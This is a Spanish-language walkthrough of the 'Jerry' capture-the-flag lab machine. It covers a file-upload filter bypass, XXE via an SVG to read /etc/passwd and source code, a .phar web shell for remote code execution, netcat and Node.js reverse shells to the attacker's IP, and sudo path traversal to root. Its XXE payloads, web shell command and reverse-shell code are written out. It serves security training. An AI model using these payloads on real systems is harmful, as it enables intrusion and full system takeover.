---
description: 'Difficulty: Hard'
---

# Jerry

* La IP de la máquina Jerry en mi caso:

<figure><img src="../../../.gitbook/assets/image (122).png" alt=""><figcaption></figcaption></figure>

### Recon

1. Lanzamos un escaneo con Nmap contra el objetivo:

```bash
sudo nmap -sCV -p- --open -T5 192.168.56.109
```

<figure><img src="../../../.gitbook/assets/image (123).png" alt=""><figcaption></figcaption></figure>

* Puertos identificados:
  * 22 → Servicio SSH
  * 25 → Servicio SMTP
  * 80 → Servicio HTTP

2. Añadimos la IP y el host al archivo **/etc/hosts**:

<figure><img src="../../../.gitbook/assets/image (124).png" alt=""><figcaption></figcaption></figure>

3. Visitamos la web desde el navegador:

<figure><img src="../../../.gitbook/assets/image (125).png" alt=""><figcaption></figcaption></figure>

4. Navegando por la web, encontramos encontramos un formulario que nos permite subir una imagen de perfil:

<figure><img src="../../../.gitbook/assets/image (126).png" alt=""><figcaption></figcaption></figure>

### File Upload

5. Cómo el input es para subir una imagen de perfil, probaremos si podemos subir otro tipo de archivo, por ejemplo un txt :

<figure><img src="../../../.gitbook/assets/image (127).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (128).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (129).png" alt=""><figcaption></figcaption></figure>

* Pero el input valida el tipo de archivo y sólo permite imágenes.

6. Analizamos el código para ver como el input filtra que formato de archivos se suben:

<figure><img src="../../../.gitbook/assets/image (130).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (131).png" alt=""><figcaption></figcaption></figure>

* Identificamos la función **UploadCheck()** y el parámetro **accept** que sólo permite formatos de imagen.

7. Comprobamos la función **UploadCheck** para analizar cómo hace la validación del formato:

<figure><img src="../../../.gitbook/assets/image (132).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (133).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (134).png" alt=""><figcaption></figcaption></figure>

8. Analizando el código del script, en la parte que printa el mensaje "Only images are allowed", se especifican que extensiones están permitidas y si no son alguna del listado, no se permite la subida del archivo:

<figure><img src="../../../.gitbook/assets/image (135).png" alt=""><figcaption></figcaption></figure>

* Sólo están permitidas las extensiones **jpg, jpeg y png**. Por eso no ha permitido la subida del txt.

9. Este filtro, es muy fácil de bypassear. Cómo se ha visto al inspeccionar el código, es accesible desde el front-end. Con eliminar la función del input y volver a hacer **Submit** del formulario con el archivo subido en el input, se consigue subir el archivo:

<figure><img src="../../../.gitbook/assets/image (136).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (137).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (138).png" alt=""><figcaption></figcaption></figure>

* Pero parece que realmente no está subiendo nada, se puede ver en la URL.

11. El siguiente paso será hacer un fuzzing web a ver si hay algún elemento por el que seguir avanzando:

```
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://jerry.nyx/request/FUZZ.php -c
```

<figure><img src="../../../.gitbook/assets/image (139).png" alt=""><figcaption></figcaption></figure>

* 3 archivos php identificados:
  * &#x20;index → La pantalla del formulario.
  * submit → Envía el formulario al hacer click en “Submit”.
  * upload → Sube el archivo adjunto al formulario.

12. Se crea una shell.php:

<figure><img src="../../../.gitbook/assets/image (107).png" alt=""><figcaption></figcaption></figure>

13. Para la subida de shell.php se redirige el tráfico a través de Burp y se elimina la función de filtrado como se ha hecho anteriormente:

<figure><img src="../../../.gitbook/assets/image (108).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (109).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (110).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (111).png" alt=""><figcaption></figcaption></figure>

* Al eliminar la función de filtrado del front-end, se puede hacer click en el botón de subida del archivo y capturar la request POST a upload.php.

14. Al enviarla desde el Repeater, la extensión es identificada y no permite la subida:

<figure><img src="../../../.gitbook/assets/image (112).png" alt=""><figcaption></figcaption></figure>

* En el back-end de la web debe de haber otra función de blacklist que no permite las extensiones php.

### Extension Fuzzing

15. El siguiente paso es fuzzear extensiones para intentar evitar la blacklist de extensiones que debe de haber en el back-end de la web, para ello, se envía la request de subida del archivo al **Intruder**:

<figure><img src="../../../.gitbook/assets/image (113).png" alt=""><figcaption></figcaption></figure>

* Se selecciona la parte de la extensión, que es sobre se hará el fuzzing:

<figure><img src="../../../.gitbook/assets/image (114).png" alt=""><figcaption></figcaption></figure>

* Se carga una la lista de extensiones que se utilizará en el fuzzing, en el menú de la derecha del Intruder de Burp:

<figure><img src="../../../.gitbook/assets/image (115).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
\* **Recomendación**: Descargar el github de [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)

`git clone` [`https://github.com/swisskyrepo/PayloadsAllTheThings`](https://github.com/swisskyrepo/PayloadsAllTheThings)
{% endhint %}

* **Importante: D**esactivar el URL encode, porque sino encodeará las extensiones y no dará resultado:

<figure><img src="../../../.gitbook/assets/image (116).png" alt=""><figcaption></figcaption></figure>

* En Settings, añadir el mensaje “_Extension not allowed_” para que filtre las respuestas que da el servidor:

<figure><img src="../../../.gitbook/assets/image (117).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (118).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (119).png" alt=""><figcaption></figcaption></figure>

* Se inicia el ataque:

<figure><img src="../../../.gitbook/assets/image (120).png" alt=""><figcaption></figcaption></figure>

16. Al finalizar el ataque, ordenar por la columna en la que está aplicada la regex del “_Extension not allowed_” y aparecen las extensiones que no están blacklisteadas y permiten la subida del fichero:

<figure><img src="../../../.gitbook/assets/image (121).png" alt=""><figcaption></figcaption></figure>

### File Upload into XXE

17. Ahora que conocemos las extensiones válidas, vamos a usarlo en la explotación. Para ello, descargamos una imagen **svg**:

<figure><img src="../../../.gitbook/assets/image (77).png" alt=""><figcaption></figcaption></figure>

18. Repetimos en el formulario la eliminación de la función de validación:

<figure><img src="../../../.gitbook/assets/image (78).png" alt=""><figcaption></figcaption></figure>

19. Redirigimos el tráfico a Burp e interceptamos la request para enviarla al **Repeater**:

<figure><img src="../../../.gitbook/assets/image (79).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (80).png" alt=""><figcaption></figcaption></figure>

20. Con la request de subida de la **imagen svg** en el **Repeater**, probaremos con el siguiente **payload** a ver si podemos mostrar archivos del sistema objetivo:

```xml
<?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```

<figure><img src="../../../.gitbook/assets/image (81).png" alt=""><figcaption></figcaption></figure>

* Esto sucede porque las imágenes **SVG** contienen código **XML**, que nos permite la ejecución de código en la máquina objetivo.
* Usuarios identificados:
  * kramer
  * jerry
  * elaine

21. Podemos visualizar archivos del sistema, pero también mostrar el código de archivos como tal. Al hacer el fuzzing hemos identificado **upload.php,** que por lo que hemos ido avanzando en la máquina, es el archivo que hace la subida del archivo adjunto desde el formulario al server. Utilizaremos el siguiente payload para mostrar su código fuente y entender el funcionamiento de subida:

```xml
<?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]>
<svg>&xxe;</svg>
```

<figure><img src="../../../.gitbook/assets/image (82).png" alt=""><figcaption></figcaption></figure>

* El código del archivo viene encodeado en base64, así que lo decodeamos:

```bash
echo -n “código_upload.php_base64” | base64 -d
```

<figure><img src="../../../.gitbook/assets/image (83).png" alt=""><figcaption></figcaption></figure>

* Ahora el código es legible. Se puede ver en que directorio se sube el archivo del formulario, cómo lo renombra, la blacklist, etc.

### RCE

22. Ahora recuperaremos la request de subida de la **shell.php**.  En la blacklist del código decodeado aparecen las extensiones que están bloqueadas, pero una de las que hemos identificado con el **Intruder** si que nos funcionaría. En la request, cambiamos la extensión de shell.php a **shell.phar** y la enviamos de nuevo desde el **Repeater**:

<figure><img src="../../../.gitbook/assets/image (84).png" alt=""><figcaption></figcaption></figure>

* Esta vez el archivo se sube de forma correcta.

23. Cómo hemos identificado anteriormente, el archivo subido cambia de nombre (añadiendo la fecha actual, en un formato específico) y se sube al directorio **job\_request\_files**, así que accedemos a la ruta desde el navegador, añadiendo un comando para su ejecución desde el cmd que incluye el archivo .phar:

> http://jerry.nyx/request/job\_request\_files/25-09-22\_shell.phar?cmd=id

<figure><img src="../../../.gitbook/assets/image (85).png" alt=""><figcaption></figcaption></figure>

* Conseguimos la ejecución de código remoto en la máquina víctima.

### Reverse Shell

24. Vamos a ejecutar una reverse shell contra nuestra máquina atacante, para que nos sea más cómodo operar en los siguientes pasos:

> http://jerry.nyx/request/job\_request\_files/24-09-23\_shell.phar?cmd=busybox nc 192.168.56.101 1234 -e sh

<figure><img src="../../../.gitbook/assets/image (86).png" alt=""><figcaption></figcaption></figure>

* Previamente se deja una consola a la escucha:

```bash
nc -vnlp 1234
```

<figure><img src="../../../.gitbook/assets/image (87).png" alt=""><figcaption></figcaption></figure>

* Recibimos la conexión al acceder a la URL anterior:

<figure><img src="../../../.gitbook/assets/image (88).png" alt=""><figcaption></figcaption></figure>

25. Listamos el contenido de la carpeta en la que nos encontramos:

<figure><img src="../../../.gitbook/assets/image (89).png" alt=""><figcaption></figcaption></figure>

* Se pueden ver varios archivos que he subido de prueba, los del ataque del Intruder, además del index.php.

### Privilege Escalation

26. Listamos los usuarios disponibles desde el directorio /home/

<figure><img src="../../../.gitbook/assets/image (90).png" alt=""><figcaption></figcaption></figure>

27. Uno de los puertos abiertos es el **25 (SMTP)**, lo que quiere decir que hay un servicio de mail. Para visualizar los mails enviados por los usuarios, iremos al directorio **/var/mail**:

<figure><img src="../../../.gitbook/assets/image (91).png" alt=""><figcaption></figcaption></figure>

* No tenemos permisos sobre estos directorios porque peretenecen a los usuarios.

28. Vamos a realizar enumeración de archivos sobre los que tengamos permisos de escritura:

```bash
find / -writable 2>/dev/null | grep -v -i -E 'proc|run|sys|dev'
```

{% hint style="info" %}
Payload obtenido del blog de J4ckie0x17: [https://j4ckie0x17.gitbook.io/notes-pentesting/escalada-de-privilegios/linux#encontrar-carpetas-archivos-que-podemos-escribir](https://j4ckie0x17.gitbook.io/notes-pentesting/escalada-de-privilegios/linux#encontrar-carpetas-archivos-que-podemos-escribir)
{% endhint %}

<figure><img src="../../../.gitbook/assets/image (92).png" alt=""><figcaption></figcaption></figure>

* Pero no hay nada interesante.

29. Navegando por las carpetas de la raíz, identificamos contenido útil en el directorio /opt:

<figure><img src="../../../.gitbook/assets/image (93).png" alt=""><figcaption></figcaption></figure>

30. Dentro del directorio scripts está el archivo **backup.js**, leyendo su código se puede ver que en la carpeta **backups\_mail** se están creando archivos comprimidos en ZIP.

<figure><img src="../../../.gitbook/assets/image (94).png" alt=""><figcaption></figcaption></figure>

* Listamos el contenido de backups\_mail, y tenemos permisos de lectura:

<figure><img src="../../../.gitbook/assets/image (95).png" alt=""><figcaption></figcaption></figure>

31. Descargamos los archivos comprimidos a nuestra máquina atacante para leerlos:

* Levantamos un **servidor PHP** en la máquina víctima:

```bash
php -S 0.0.0.0:8080
```

* Desde la máquina atacante, descargamos los archivos:

```wasm
wget 192.168.56.109:8080/archivo_backup.zip
```

<figure><img src="../../../.gitbook/assets/image (96).png" alt=""><figcaption></figcaption></figure>

* Descomprensión de los archivos ya en la máquina atacante:

```bash
unzip archivo_backup.zip
```

<figure><img src="../../../.gitbook/assets/image (97).png" alt=""><figcaption></figcaption></figure>

32. Investigamos el contenido de los mails, que son conversaciones entre los usuarios, y encontramos una posible contraseña:

<figure><img src="../../../.gitbook/assets/image (98).png" alt=""><figcaption></figcaption></figure>

33. Probamos el acceso por SSH con el usuario **elaine** y la contraseña que acabamos de encontrar:

<figure><img src="../../../.gitbook/assets/image (99).png" alt=""><figcaption></figcaption></figure>

* La contraseña es correcta y se consigue la conexión por SSH con el usuario elaine.

34. Buscamos sobre que tiene permisos de ejecución sin contraseña el usuario elaine:

<figure><img src="../../../.gitbook/assets/image (100).png" alt=""><figcaption></figcaption></figure>

* Tiene permisos de ejecución sobre los **.js** dentro de **/opt/scripts/,** así que el script de backups que hemos identificado anteriormente, se puede ejecutar desde el usuario **elaine**.

35. Al tener permisos de root sobre **/opt/scripts/\*.js** la forma de avanzar sería creando una reverse shell con **javascript** y ejecutarla indirectamente de la siguiente manera:

* reverse\_shell.js:

```javascript
(function(){ var net = require("net"), cp = require("child_process"), sh = cp.spawn("/bin/sh", []); var client = new net.Socket(); client.connect(4444, "192.168.56.101", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/; })();
```

* La creamos dentro del directorio tmp:

<figure><img src="../../../.gitbook/assets/image (102).png" alt=""><figcaption></figcaption></figure>

* Ponemos una consola a la escucha:

```bash
nc -vnlp 4444
```

<figure><img src="../../../.gitbook/assets/image (103).png" alt=""><figcaption></figcaption></figure>

* La ejecutaremos a través de la ruta de la que elaine tiene permitida la ejecución como sudo:

```bash
sudo /usr/bin/node /opt/scripts/*.js/../../../../../../tmp/reverse_shell.js
```

<figure><img src="../../../.gitbook/assets/image (104).png" alt=""><figcaption></figcaption></figure>

* Recibimos la conexión como root en la consola a la escucha:

<figure><img src="../../../.gitbook/assets/image (105).png" alt=""><figcaption></figcaption></figure>

### Flags

#### Flag user

* La flag **user.txt** se encuentra en el directorio del usuario **elaine**:

<figure><img src="../../../.gitbook/assets/image (101).png" alt=""><figcaption></figcaption></figure>

#### Flag root

* La flag **root.txt** se encuentra en el directorio del usuario **root:**

<figure><img src="../../../.gitbook/assets/image (106).png" alt=""><figcaption></figcaption></figure>
